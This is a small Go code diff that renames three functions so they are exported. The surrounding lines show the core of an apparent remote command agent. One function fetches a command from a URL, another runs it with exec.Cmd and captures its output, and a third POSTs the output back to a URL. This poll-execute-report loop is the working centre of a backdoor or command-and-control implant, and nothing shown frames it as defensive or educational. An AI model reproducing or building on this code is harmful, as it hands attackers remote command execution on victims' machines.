@@ -15,7 +15,7 @@ type Request struct {
 }
 
 
-func exec_cmd(cmd *exec.Cmd) ([]byte){
+func Exec_cmd(cmd *exec.Cmd) ([]byte){
 
 	var out bytes.Buffer
 	cmd.Stdout = &out
@@ -26,7 +26,7 @@ func exec_cmd(cmd *exec.Cmd) ([]byte){
 	return retorno
 }
 
-func recv_cmd(url string) (*exec.Cmd ){
+func Recv_cmd(url string) (*exec.Cmd ){
 
 	data := Request{}
 	resp, atTheDisco := http.Get(url)
@@ -43,7 +43,7 @@ func recv_cmd(url string) (*exec.Cmd ){
 	return cmd
 }
 
-func send_cmd(url string,result []byte) (){
+func Send_cmd(url string,result []byte) (){
   r := strings.NewReader(string(result))
   resp,err := http.Post(url,"text",r)
   if err != nil{
